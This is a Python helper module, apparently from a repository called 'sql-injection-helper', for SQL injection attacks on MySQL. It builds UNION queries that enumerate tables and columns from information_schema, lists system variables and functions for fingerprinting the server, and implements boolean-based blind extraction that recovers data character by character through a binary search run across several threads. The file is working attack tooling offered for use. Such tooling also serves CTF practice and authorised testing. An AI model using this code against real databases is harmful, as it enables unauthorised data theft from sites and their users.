# https://github.com/volltin/sql-injection-helper/blob/master/sqltools.py

# https://websec.ca/kb/sql_injection
import string

printable = sorted(string.printable)

sql_consts = ["current_timestamp"]
# more: http://dev.mysql.com/doc/refman/5.1/en/reserved-words.html

sql_sys_vars = ["@@version", "@@hostname", "@@datadir", "@@basedir", "@@tmpdir"]
# more: https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html

sql_functions = ["user()", "database()", "version()", "row_count()", "current_user()", "last_insert_id()"]
# more: https://dev.mysql.com/doc/refman/5.7/en/functions.html

sql_exprs = sql_consts + sql_sys_vars + sql_functions

# union

def retrieve_tables(TABLE_SCHEMA=None):
    sql = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables"
    if TABLE_SCHEMA:
        sql += " WHERE TABLE_SCHEMA = \"" + TABLE_SCHEMA + "\""
    return sql

def retrieve_columns(TABLE_NAME=None):
    sql = "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns"
    if TABLE_NAME:
        sql += " WHERE TABLE_NAME = \"" + TABLE_NAME + "\""
    return sql

def retrieve_item(column, table, cond=None):
    sql = "SELECT GROUP_CONCAT({column}) FROM {table}".format(column=column, table=table)
    if cond:
        sql += " WHERE " + cond
    return sql


"""
Condition A:
  [check_func(x) for x in check_range] == [True] * x + [False] * y
Condition B:
  retrieve_func has no side effect.
"""

# boolean

def first_false(check_func, check_range):
    """
    Condition A.
    """
    from bisect import bisect_left

    class SeacherSpace:
        def __init__(self, check_func, check_range):
            self.check_func = check_func
            self.check_range = check_range

        def __len__(self):
            return len(self.check_range)

        def __getitem__(self, idx):
            return 0 if self.check_func(self.check_range[idx]) else 1

    idx = bisect_left(SeacherSpace(check_func, check_range), 1)
    return check_range[idx]

def first_false_pre(answer, check_range):
    """
    return previous one of `answer` in the `check_range`
    """
    return check_range[check_range.index(answer) - 1]

def threading_retrieve(retrieve_func, retrieve_range, max_threads=10):
    """
    Condition B.
    """
    import threading

    class myThread(threading.Thread):
        def __init__(self, thread_id, retrieve_func):
            threading.Thread.__init__(self)
            self.thread_id = thread_id
            self.retrieve_func = retrieve_func

        def run(self):
            return self.retrieve_func(self.thread_id)

    threads = []
    for thread_id in retrieve_range:
        threads.append(myThread(thread_id, retrieve_func))

    for t in threads:
        t.start()
        while True:
            if len(threading.enumerate()) < max_threads:
                break

def retrieve(check_func, check_range, retrieve_range, max_threads=10):
    """
    Condition A && Conditon B.
    """
    data = list('.' * len(retrieve_range))

    def retrieve_func(pos):
        ret = first_false(lambda c: check_func(pos, c), check_range)
        data[retrieve_range.index(pos)] = first_false_pre(ret, check_range)
        print("".join(data))
        return ret

    threading_retrieve(retrieve_func, retrieve_range, max_threads)

if __name__ == "__main__":
    pass
